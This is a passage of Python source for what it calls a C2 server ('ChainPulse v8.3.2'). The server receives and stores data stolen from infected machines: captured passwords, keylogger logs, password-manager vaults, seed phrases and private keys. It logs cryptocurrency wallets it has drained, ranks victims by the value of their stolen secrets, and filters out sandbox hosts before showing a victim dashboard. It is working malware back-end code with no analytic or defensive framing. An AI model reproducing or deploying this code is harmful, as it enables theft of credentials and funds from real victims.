                    epl["secrets"] = esec
                    if pl.get("keylog") and (pl["keylog"].get("count") or pl["keylog"].get("entries")):
                        epl["keylog"] = pl["keylog"]
                    if pl.get("highlights"):
                        eh = list(epl.get("highlights") or [])
                        seen_h = set()
                        for h in eh:
                            seen_h.add(json.dumps(h, sort_keys=True, default=str)[:200])
                        for h in pl["highlights"]:
                            key = json.dumps(h, sort_keys=True, default=str)[:200]
                            if key not in seen_h:
                                eh.append(h)
                                seen_h.add(key)
                        epl["highlights"] = eh
                    if pl.get("password_managers"):
                        pm = list(epl.get("password_managers") or [])
                        for x in pl["password_managers"]:
                            if x not in pm:
                                pm.append(x)
                        epl["password_managers"] = pm
                    epl["chunk_parts"] = (epl.get("chunk_parts") or 0) + 1
                    existing["payload"] = epl
                    existing["timestamp"] = env.get("timestamp") or existing.get("timestamp")
                    existing["endpoint"] = base_ep
                    with open(merge_path, "w") as mf:
                        json.dump(existing, mf, indent=2, default=str)
                    fpath = merge_path
                    merged = True
                    nfiles = len(efiles)
                else:
                    # seed merge file from this part
                    seed = dict(env)
                    seed["endpoint"] = base_ep
                    seed["payload"] = dict(pl)
                    seed["payload"]["chunk_parts"] = 1
                    with open(merge_path, "w") as mf:
                        json.dump(seed, mf, indent=2, default=str)
                    fpath = merge_path
                    merged = True

            if not merged:
                fname = f"{endpoint}_{safe_host}_{ts}.json"
                fpath = os.path.join(cdir, fname)
                with open(fpath, "w") as f:
                    json.dump(env, f, indent=2, default=str)

            dr = pl.get("drain_results", [])
            for r in dr:
                if r.get("status") == "drained":
                    amt = r.get("amount_ether", r.get("amount_human", r.get("amount_sol", 0)))
                    sym = r.get("symbol", r.get("chain", "?"))
                    try:
                        print(f"[$$] DRAINED {float(amt):.6f} {sym} | tx: {str(r.get('tx_hash','?'))[:16]}...")
                    except Exception:
                        print(f"[$$] DRAINED {amt} {sym}")

            seeds = pl.get("secrets", {}).get("seed_phrases", [])
            if seeds:
                print(f"[!!!] SEED PHRASES: {len(seeds)} found!")

            print(f"[+] {endpoint} | campaign={campaign} | host={host} | files={nfiles} | merged={merged} | {fpath}")
            self._serve_json({"status": "ok", "campaign": campaign, "endpoint": endpoint, "merged": merged})

        except Exception as e:
            print(f"[-] Error: {e}")
            try:
                self._serve_json({"status": "error", "error": str(e)[:300]}, code=500)
            except Exception:
                self.send_error(500)

    def _serve_html(self, html):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_json(self, data, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _get_summary(self):
        campaigns = []
        total_files = 0
        recent = []
        all_entries = []
        try:
            for cdir in sorted(os.listdir(LOOT_DIR)):
                cp = os.path.join(LOOT_DIR, cdir)
                if not os.path.isdir(cp):
                    continue
                files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
                total_files += len(files)
                campaigns.append({"name": cdir, "files": len(files)})
                for fp in files[:80]:
                    try:
                        with open(fp) as f:
                            all_entries.append(json.load(f))
                    except Exception:
                        pass
        except Exception:
            pass

        hosts = set()
        real = []
        noise = []
        for r in all_entries:
            pl = r.get("payload") or r
            si = pl.get("system_info") or {}
            h = si.get("hostname") or pl.get("host") or ""
            u = si.get("user") or pl.get("user") or ""
            o = si.get("os") or pl.get("os") or ""
            if h:
                hosts.add(h)
            if _is_noise_host(h, u, o):
                noise.append(r)
            else:
                real.append(r)
        def _score(r):
            pl = r.get("payload") or r
            sec = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
            hl = pl.get("highlights") if isinstance(pl.get("highlights"), list) else []
            score = 0
            score += 100 * len(sec.get("captured_passwords") or [])
            score += 200 * len(sec.get("seed_phrases") or [])
            score += 150 * len(sec.get("private_keys") or [])
            score += 50 * len(hl)
            score += 10 * len(sec.get("decrypted_vaults") or [])
            ts = str(r.get("timestamp") or pl.get("timestamp") or pl.get("time") or "")
            return (score, ts)

        real.sort(key=_score, reverse=True)
        noise.sort(key=_score, reverse=True)
        # Prefer real hosts; fill with noise only if empty
        recent = (real + noise)[:40]
        real_hosts = set()
        for r in real:
            pl = r.get("payload") or r
            si = pl.get("system_info") or {}
            h = si.get("hostname") or pl.get("host") or ""
            if h:
                real_hosts.add(h)
        return {
            "campaign_count": len(campaigns),
            "campaigns": campaigns,
            "total_victims": len(real_hosts) or len(hosts),
            "total_files": total_files,
            "recent": recent,
            "noise_filtered": len(noise),
        }


if __name__ == "__main__":
    print(f"[C2] ChainPulse v8.3.2 (Render) — http://{HOST}:{PORT}")
    print(f"[C2] Dashboard: /dashboard")
    print(f"[C2] Health:    /health")
    print(f"[C2] Loot dir:  {LOOT_DIR}")
    server = ThreadingHTTPServer((HOST, PORT), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[C2] Shutting down...")
        server.shutdown()
